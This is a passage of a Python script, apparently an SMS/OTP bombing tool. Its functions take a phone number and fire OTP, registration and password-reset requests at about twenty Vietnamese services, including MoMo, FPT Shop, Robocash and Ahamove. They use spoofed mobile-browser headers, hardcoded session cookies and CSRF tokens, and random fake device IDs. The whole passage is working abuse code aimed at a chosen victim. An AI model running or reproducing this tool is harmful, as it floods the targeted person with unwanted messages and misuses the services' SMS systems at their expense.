    requests.post("https://api.momo.vn/backend/auth-app/public/CHECK_USER_BE_MSG",headers=h,data=data1).text
    t = requests.post("https://api.momo.vn/backend/otp-app/public/SEND_OTP_MSG",headers=h,data=data)
    try:
        t = t.json()
    except:
        t = t.text
def generateRandomString(length, minh):
    return ''.join(random.choices(minh, k=length))
def get_SECUREID():
    return ''.join(random.choices('0123456789abcdef', k=17))
def getimei():
    return generateRandomString(8, '0123456789abcdef')+'-'+generateRandomString(4, '0123456789abcdef')+'-'+generateRandomString(4, '0123456789abcdef')+'-'+generateRandomString(4, '0123456789abcdef')+'-'+generateRandomString(12, '0123456789abcdef')
def get_TOKEN():
    return generateRandomString(22, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+':'+generateRandomString(9, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(20, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(12, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(7, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(7, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(53, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(9, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'_'+generateRandomString(11, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(4, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')
  
def fpt(phone):
    requests.post("https://fptshop.com.vn/api-data/loyalty/Home/Verification", headers={"Host": "fptshop.com.vn","content-length": "16","accept": "*/*","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://fptshop.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptshop.com.vn/","accept-encoding": "gzip, deflate, br"}, data={"phone":phone}).text
    
def call3(phone):
    requests.post("https://api.senmo.vn/api/user/send-one-time-password", headers={"Host": "api.senmo.vn","content-length": "23","sec-ch-ua": "\"Chromium\";v\u003d\"104\", \" Not A;Brand\";v\u003d\"99\", \"Google Chrome\";v\u003d\"104\"","content-type": "application/json","accept-language": "vi","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","accept": "*/*","origin": "https://senmo.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://senmo.vn/user/login","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"phone":"84"+phone[1:11]})).text

def call2(phone):
    requests.post("https://api.tamo.vn/web/public/client/phone/sms-code-ts", headers={"Host": "api.tamo.vn","content-length": "39","accept": "application/json, text/plain, */*","content-type": "application/json;charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://www.tamo.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.tamo.vn/","accept-encoding": "gzip, deflate, br"}, json=({"mobilePhone":{"number":"0"+phone[1:11]}})).text
    
def call1(phone):
    requests.post("https://api.vayvnd.vn/v1/users/password-reset", headers={"Host": "api.vayvnd.vn","content-length": "22","accept": "application/json","content-type": "application/json","accept-language": "vi","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://vayvnd.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://vayvnd.vn/","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"login":"0"+phone[1:11]})).text

def call4(phone):
    Headers = {"Host": "atmonline.com.vn","content-length": "46","sec-ch-ua": "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"","accept": "application/json, text/plain, */*","content-type": "application/json","sec-ch-ua-mobile": "?1","authorization": "","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://atmonline.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://atmonline.com.vn/portal-new/login?mobilePhone\u003d0777531398\u0026requestedAmount\u003d4000000\u0026requestedTerm\u003d4\u0026locale\u003dvn\u0026designType\u003dNEW","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "_ga_181P8FC3KD\u003dGS1.1.1681739176.1.1.1681739193.43.0.0"}
    Datason = json.dumps({"mobilePhone": phone,"source":"ONLINE"})
    response = requests.post("https://atmonline.com.vn/back-office/api/json/auth/sendAcceptanceCode",  data=Datason, headers=Headers)
    
def call5(phone):
    Headers = {"Host": "api.thantaioi.vn","content-length": "23","sec-ch-ua": "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"","content-type": "application/json","accept-language": "vi","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","accept": "*/*","origin": "https://thantaioi.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://thantaioi.vn/user/login","accept-encoding": "gzip, deflate, br","cookie": "_ga_LBS7YCVKY6\u003dGS1.1.1681807570.2.1.1681807596.34.0.0"}
    Datason = json.dumps({"phone": f"84{phone[1:11]}"})
    response = requests.post("https://api.thantaioi.vn/api/user/send-one-time-password", data=Datason, headers=Headers)

def call9(phone):
  cookies = {
    'supportOnlineTalkID':
    'Tgae5HbMTkxEJl3bJFHW90Marnk0g0x6',
    '__cfruid':
    'f1a6f7bd1587ecec8ebc3b75f57137c8af12676c-1682928280',
    'XSRF-TOKEN':
    'eyJpdiI6Ik9XT3lTck9TTFZQU3hrUzlxaXhWUUE9PSIsInZhbHVlIjoicmZlNEJ5SmJzKzJGSytKK2xDeFF4RlZtWXlnQ2ZWbXl6a3l6WWtwT3M2dFB1OHpLeWdLczBrTTlNT0ZVNXRlL0xmcUh2SWpHclZJSGRMenhqc3J4N2JnTllYZlowOGViQ3B4U1Iwb1VYQ2dPcDRKd3ZyWVRUQ2hEbitvT0lYb2IiLCJtYWMiOiIxMjg4MWM4MmMyYTM3N2ZkNDVkNmI0YTFiNTNmOTc4N2QxMjExNjc1MDZmYWNlNDlhMmE2MzVhZWVkYzBiZjViIiwidGFnIjoiIn0%3D',
    'sessionid':
    'eyJpdiI6InUyUXBmZGx5dEExYjVmaGt3UlQ3Mnc9PSIsInZhbHVlIjoiSGhzckx3U1lqYVRFY2hHdXZBalJ0ZzV5cHhqSUpsOGJVZzlJajVOTituZDRXR3o2cGNJRnFFWUpOYzAvdmlNd3BGS1JjTm1maE5QVS9DU0VqdkZMRGZ1N3dVOCszMGxuekw4S3BxSCtXY1ZCWFlqZjAzWlBDMHJqcm5yOHh3MHIiLCJtYWMiOiI3ZmQ2ZGZiM2FmNjJjODc4OWM0YTUwMmZlZjA3MmNjZWFiODAzNGQ5MDE5ZmJjM2MxOGVhZjY1ZjVjMDlmZWUwIiwidGFnIjoiIn0%3D',
    'utm_uid':
    'eyJpdiI6IlFWMWI0dUtNaGM4MUZVUHg0TWg1YXc9PSIsInZhbHVlIjoiNVcyVjh0UmZuUG4xUjRUTTR6enFHbVFMdmkyb0tTOWozMFBsdkNiT0hPcEt5TlloWk51aVJ2OVFNdHoyWGZ5SHZwcVBsYnhSZXpPUytiek0vZjNrNG5rUkVqTkpyeWZmTjRBT09aaGV3QWF2SzBMUEFxZ0xTeURnZy9rdThOcFciLCJtYWMiOiJlOWZhNzNkNTNhZGJiODgxMjIxN2ZjMTY4ZDk2NjRhNDc5MTVjMjNjYjQ3ZmZmZTk5NzcxNDJiODI4NzI2YWNmIiwidGFnIjoiIn0%3D',
    'ec_cache_utm':
    '2ecb18ca-827d-53c1-5f1a-7d106859d9e5',
    'ec_cache_client':
    'false',
    'ec_cache_client_utm':
    '%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
    'ec_png_client':
    'false',
    'ec_png_utm':
    '2ecb18ca-827d-53c1-5f1a-7d106859d9e5',
    'ec_etag_client':
    'false',
    'ec_png_client_utm':
    '%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
    'ec_etag_utm':
    '2ecb18ca-827d-53c1-5f1a-7d106859d9e5',
    'ec_etag_client_utm':
    '%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
    'uid':
    '2ecb18ca-827d-53c1-5f1a-7d106859d9e5',
    'client':
    'false',
    'client_utm':
    '%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
  }

  headers = {
    'authority': 'robocash.vn',
    'accept': '*/*',
    'accept-language':
    'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'supportOnlineTalkID=Tgae5HbMTkxEJl3bJFHW90Marnk0g0x6; __cfruid=f1a6f7bd1587ecec8ebc3b75f57137c8af12676c-1682928280; XSRF-TOKEN=eyJpdiI6Ik9XT3lTck9TTFZQU3hrUzlxaXhWUUE9PSIsInZhbHVlIjoicmZlNEJ5SmJzKzJGSytKK2xDeFF4RlZtWXlnQ2ZWbXl6a3l6WWtwT3M2dFB1OHpLeWdLczBrTTlNT0ZVNXRlL0xmcUh2SWpHclZJSGRMenhqc3J4N2JnTllYZlowOGViQ3B4U1Iwb1VYQ2dPcDRKd3ZyWVRUQ2hEbitvT0lYb2IiLCJtYWMiOiIxMjg4MWM4MmMyYTM3N2ZkNDVkNmI0YTFiNTNmOTc4N2QxMjExNjc1MDZmYWNlNDlhMmE2MzVhZWVkYzBiZjViIiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6InUyUXBmZGx5dEExYjVmaGt3UlQ3Mnc9PSIsInZhbHVlIjoiSGhzckx3U1lqYVRFY2hHdXZBalJ0ZzV5cHhqSUpsOGJVZzlJajVOTituZDRXR3o2cGNJRnFFWUpOYzAvdmlNd3BGS1JjTm1maE5QVS9DU0VqdkZMRGZ1N3dVOCszMGxuekw4S3BxSCtXY1ZCWFlqZjAzWlBDMHJqcm5yOHh3MHIiLCJtYWMiOiI3ZmQ2ZGZiM2FmNjJjODc4OWM0YTUwMmZlZjA3MmNjZWFiODAzNGQ5MDE5ZmJjM2MxOGVhZjY1ZjVjMDlmZWUwIiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IlFWMWI0dUtNaGM4MUZVUHg0TWg1YXc9PSIsInZhbHVlIjoiNVcyVjh0UmZuUG4xUjRUTTR6enFHbVFMdmkyb0tTOWozMFBsdkNiT0hPcEt5TlloWk51aVJ2OVFNdHoyWGZ5SHZwcVBsYnhSZXpPUytiek0vZjNrNG5rUkVqTkpyeWZmTjRBT09aaGV3QWF2SzBMUEFxZ0xTeURnZy9rdThOcFciLCJtYWMiOiJlOWZhNzNkNTNhZGJiODgxMjIxN2ZjMTY4ZDk2NjRhNDc5MTVjMjNjYjQ3ZmZmZTk5NzcxNDJiODI4NzI2YWNmIiwidGFnIjoiIn0%3D; ec_cache_utm=2ecb18ca-827d-53c1-5f1a-7d106859d9e5; ec_cache_client=false; ec_cache_client_utm=%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D; ec_png_client=false; ec_png_utm=2ecb18ca-827d-53c1-5f1a-7d106859d9e5; ec_etag_client=false; ec_png_client_utm=%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D; ec_etag_utm=2ecb18ca-827d-53c1-5f1a-7d106859d9e5; ec_etag_client_utm=%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D; uid=2ecb18ca-827d-53c1-5f1a-7d106859d9e5; client=false; client_utm=%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
    'origin': 'https://robocash.vn',
    'referer': 'https://robocash.vn/register',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent':
    'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
  }

  data = {
    'phone': phone,
    '_token': 'iSkFRbkX3IamHEhtVZAi9AZ3PLRlaXMjX1hJJS3I',
  }

  requests.post('https://robocash.vn/register/phone-resend',
                cookies=cookies,
                headers=headers,
                data=data)
     
def concung(phone):
    Headers = {"Host": "concung.com","content-length": "121","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","accept": "*/*","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://concung.com","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://concung.com/dang-nhap.html","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "_ga_BBD6001M29\u003dGS1.1.1679234342.1.1.1679234352.50.0.0"}
    Payload = {"ajax": "1","classAjax": "AjaxLogin","methodAjax": "sendOtpLogin","customer_phone": phone,"id_customer": "0","momoapp": "0","back": "khach-hang.html"}
    response = requests.post("https://concung.com/ajax.html", data=Payload, headers=Headers)

def cafeland(phone):
    Headers = {"Host": "nhadat.cafeland.vn","content-length": "65","accept": "application/json, text/javascript, */*; q\u003d0.01","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://nhadat.cafeland.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://nhadat.cafeland.vn/dang-ky.html","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "laravel_session\u003deyJpdiI6IkhyUE8yblwvVFA1Um9KZnQ3K0syalZ3PT0iLCJ2YWx1ZSI6IlZkaG1mb3JpTUtsdjVOT3dSa0RNUFhWeDBsT21QWlcra2J5bFNzT1Q5RHdQYm83UVR4em1hNUNUN0ZFYTlIeUwiLCJtYWMiOiJiYzg4ZmU2ZWY3ZTFiMmM4MzE3NWVhYjFiZGUxMDYzNjRjZWE2MjkwYjcwOTdkMDdhMGU0OWI0MzJkNmFiOTg2In0%3D"}
    Payload = {"mobile": phone,"_token": "bF6eZbKCCrOoXVKoixlRXzhTssc90B3KwRox2F4w",}
    response = requests.post("https://nhadat.cafeland.vn/member-send-otp/", data=Payload, headers=Headers)

def moneydong(phone):
    Headers = {"Host": "api.moneydong.vip","content-length": "72","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","accept": "application/json, text/plain, */*","content-type": "application/x-www-form-urlencoded","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://h5.moneydong.vip","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://h5.moneydong.vip/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Payload = {"phone": phone[1:11], "type": "2", "ctype": "1", "chntoken": "69ad075c94c279e43608c5d50b77e8b9"}
    response = requests.post("https://api.moneydong.vip/h5/LoginMessage_ultimate", data=Payload, headers=Headers)
     
def call10(phone):
  headers = {
    'authority':
    'api.dongplus.vn',
    'accept':
    '*/*',
    'accept-language':
    'vi',
    'content-type':
    'application/json',
    'origin':
    'https://dongplus.vn',
    'referer':
    'https://dongplus.vn/user/login',
    'sec-ch-ua':
    '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile':
    '?1',
    'sec-ch-ua-platform':
    '"Android"',
    'sec-fetch-dest':
    'empty',
    'sec-fetch-mode':
    'cors',
    'sec-fetch-site':
    'same-site',
    'user-agent':
    'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
  }

  json_data = {
    'phone': phone,
  }
  requests.post('https://api.dongplus.vn/api/user/send-one-time-password',
                headers=headers,
                json=json_data)                                                                

def gotadi(phone):
    Headers = {"Host": "api.gotadi.com","content-length": "44","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","accept": "application/json","sec-ch-ua-platform": "\"Android\"","gtd-client-tracking-device-id": "85519cab-85d7-4881-abfa-65d2a2bb3a52","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","content-type": "application/json","origin": "https://www.gotadi.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.gotadi.com/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Datason = json.dumps({"phoneNumber": phone,"language":"VI"})
    response = requests.post("https://api.gotadi.com/b2c-web/api/register/phone-number/resend-otp", data=Datason, headers=Headers)
###
def funring(phone):
    Headers = {"Host": "funring.vn","Connection": "keep-alive","Content-Length": "28","Accept": "*/*","User-Agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","Content-Type": "application/json","Origin": "http://funring.vn","Referer": "http://funring.vn/module/register_mobile.jsp","Accept-Encoding": "gzip, deflate","Accept-Language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","Cookie": "JSESSIONID\u003dNODE011a2c48nzutiw8p6cy3nabxbx974764.NODE01; _ga\u003dGA1.2.1626827841.1679236846; _gid\u003dGA1.2.888694467.1679236846; _gat\u003d1"}
    Datason = json.dumps({"username": phone[1:11]})
    response = requests.post("http://funring.vn/api/v1.0.1/jersey/user/getotp", data=Datason, headers=Headers)

def call11(phone):
  cookies = {
    'OnCredit_id': '643d8607c6ffe8.92935100',
    'fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef':
    'o18F9FMkyjwzc8WWI7lEDpIVIrahUYQaI/C6s8jYjLI=',
    'SN5c8116d5e6183': 'rfsd6jmf1e0daeapvmv1p0i6bu',
  }

  headers = {
    'authority': 'oncredit.vn',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language':
    'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'OnCredit_id=643d8607c6ffe8.92935100; fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef=o18F9FMkyjwzc8WWI7lEDpIVIrahUYQaI/C6s8jYjLI=; SN5c8116d5e6183=rfsd6jmf1e0daeapvmv1p0i6bu',
    'origin': 'https://oncredit.vn',
    'referer': 'https://oncredit.vn/registration',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent':
    'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
  }

  data = {
    'data[typeData]':
    'sendCodeReg',
    'data[phone]':
    phone,
    'data[email]':
    'tv5v4v4v4c@gmail.com',
    'data[captcha1]':
    '1',
    'data[lang]':
    'vi',
    'CSRFName':
    'CSRFGuard_ajax',
    'CSRFToken':
    't8ETz5Y5HFnBefT9dEnDBDe9S4D5RdyEFNKSFDn8b5YSFAB7yr5rD5QZ6b974ARi',
  }

  requests.post('https://oncredit.vn/?ajax',
                cookies=cookies,
                headers=headers,
                data=data)

def fptplay(phone):
    Headers = {"Host": "api.fptplay.net","content-length": "89","sec-ch-ua": "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"","accept": "application/json, text/plain, */*","content-type": "application/json; charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://fptplay.vn","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptplay.vn/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Datason = json.dumps({"phone": phone,"country_code":"VN","client_id":"vKyPNd1iWHodQVknxcvZoWz74295wnk8"})
    response = requests.post("https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st\u003dEim9hpobCZPoIoVVokkIDA\u0026e\u003d1681802671\u0026device\u003dChrome(version%253A112.0.0.0)\u0026drm\u003d1", data=Datason, headers=Headers)   
                                                                      
def vietid(phone):
    csrfget = requests.post("https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F").text
    csrf = csrfget.split('name="csrf-token" value="')[1].split('"/>')[0]
    Headers = {"Host": "oauth.vietid.net","content-length": "41","cache-control": "max-age\u003d0","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","sec-ch-ua-mobile": "?1","sec-ch-ua-platform": "\"Android\"","upgrade-insecure-requests": "1","origin": "https://oauth.vietid.net","content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.7","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "_ga_H5VRTZBFLG\u003dGS1.1.1679234987.1.0.1679234987.0.0.0"}
    Payload = {"csrf-token": csrf,"account": phone}
    response = requests.post("https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F", data=Payload, headers=Headers)
###
def ahamove(phone):
    mail = random_string(6)
    Headers = {"Host": "api.ahamove.com","content-length": "114","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","accept": "application/json, text/plain, */*","content-type": "application/json;charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://app.ahamove.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://app.ahamove.com/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Datason = json.dumps({"mobile":f"{phone[1:11]}","name":"Tuấn","email":f"{mail}@gmail.com","country_code":"VN","firebase_sms_auth":"true"})
    Response = requests.post("https://api.ahamove.com/api/v3/public/user/register", data=Datason, headers=Headers)

def vieon1(phone):
